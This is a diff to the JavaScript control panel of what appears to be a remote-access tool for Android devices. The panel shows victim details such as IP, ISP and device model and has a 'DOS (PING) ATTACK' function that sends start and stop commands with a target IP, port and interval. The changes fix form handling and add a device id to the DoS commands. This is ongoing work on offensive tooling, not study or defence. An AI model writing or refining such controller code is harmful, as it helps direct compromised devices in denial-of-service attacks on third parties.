@@ -5,11 +5,15 @@ const img = document.getElementById("img")
 const androidScreen = document.getElementById("imgSrc")
 let CurrentDevice = ""
 let CurrentAttack = ""
+pingStop.disabled = true
 
 
+document.querySelectorAll("form").forEach(e=>{
+    e.addEventListener("submit",i=>i.preventDefault())
+})
 
 /* Clearing */
-form.reset()
+// form.reset()
 infos.innerHTML = '<div class="info">    <span>Country :</span>    <span>--</span></div><div class="info">    <span>ISP :</span>    <span>--</span></div><div class="info">    <span>IP :</span>    <span>--</span></div><div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div>'
 
 
@@ -33,15 +37,15 @@ function stopAttack(){
 function DOS(val){
     if(val){
         // START DOS (PING) ATTACK
-        if(!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "  ")){
-            msgSend("","ping","start",pingIp.value,pingPort.value,pingWait.value)
+        if(!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "")){
+            msgSend("id","ping","start",pingIp.value,pingPort.value,pingWait.value)
             pingStop.disabled = false
             pingStart.disabled = true
         }else{
             alert(42)
         }
     }else{
-        msgSend("","ping","stop")
+        msgSend("id","ping","stop")
         pingStop.disabled = true
         pingStart.disabled = false
     }
